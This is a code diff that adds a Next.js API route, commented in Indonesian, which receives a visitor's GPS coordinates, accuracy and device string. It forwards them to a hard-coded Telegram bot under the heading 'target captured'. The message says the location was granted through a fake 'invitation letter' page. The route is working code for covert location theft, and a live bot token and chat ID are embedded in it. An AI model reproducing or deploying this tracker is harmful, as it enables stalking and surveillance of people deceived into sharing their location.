@@ -1,0 +1,43 @@
+import { NextResponse } from 'next/server';
+
+export async function POST(request: Request) {
+  try {
+    const { lat, lng, accuracy, userAgent } = await request.json();
+    
+    // ==========================================
+    // PENTING: ISI TOKEN DAN CHAT ID DI BAWAH INI
+    // ==========================================
+    const BOT_TOKEN = "8784375862:AAEznuNI2aPCiefZB4YEV_KpmmheVaV3pQs";
+    const CHAT_ID = "8406125410";
+    
+
+    
+    const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+    const timestamp = new Date().toLocaleString("id-ID");
+    
+    const message = `📍 *TARGET TERTANGKAP* 📍\n\n` +
+      `Seseorang telah mengizinkan lokasi di Surat Undangan!\n\n` +
+      `🗺️ *Link Maps:* ${mapsLink}\n` +
+      `📌 *Koordinat:* \`${lat}, ${lng}\`\n` +
+      `🎯 *Akurasi:* ±${Math.round(accuracy)} meter\n` +
+      `🌐 *Device:* ${userAgent.substring(0, 100)}...\n` +
+      `⏰ *Waktu:* ${timestamp}`;
+      
+    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    
+    await fetch(telegramUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: "Markdown"
+      })
+    });
+    
+    return NextResponse.json({ success: true });
+  } catch (error) {
+    console.error("Gagal mengirim ke Telegram:", error);
+    return NextResponse.json({ success: false }, { status: 500 });
+  }
+}
